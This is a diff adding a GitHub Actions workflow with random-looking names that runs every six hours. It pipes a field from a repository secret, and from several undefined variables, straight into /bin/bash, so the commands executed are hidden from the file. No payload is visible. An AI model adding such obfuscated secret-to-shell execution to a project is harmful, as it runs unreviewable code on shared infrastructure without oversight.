@@ -1,0 +1,29 @@
+name: wotaiwenhuaa
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wotaiwenhuaa
+        env:
+          e59978: ${{ secrets.e59978 }}
+        run: |
+          echo $e59978 | jq -r .rfcem98 | /bin/bash
+          echo $q039 | jq -r .kklji4592 | /bin/bash
+          echo $cgk2 | jq -r .lk195 | /bin/bash
+          echo $j046 | jq -r .m383 | /bin/bash
+          echo $egufe4453 | jq -r .qupi52 | /bin/bash
+          echo $jffvy26 | jq -r .uds54 | /bin/bash
+          echo $vppd8 | jq -r .c4673 | /bin/bash
+          echo $f4034 | jq -r .pyhc51 | /bin/bash
+          echo $l0987 | jq -r .qjw628 | /bin/bash
+          echo $ngaqi699 | jq -r .j8 | /bin/bash
+          echo $nrh1 | jq -r .eg1357 | /bin/bash
+          echo $c93202 | jq -r .mm9 | /bin/bash
+
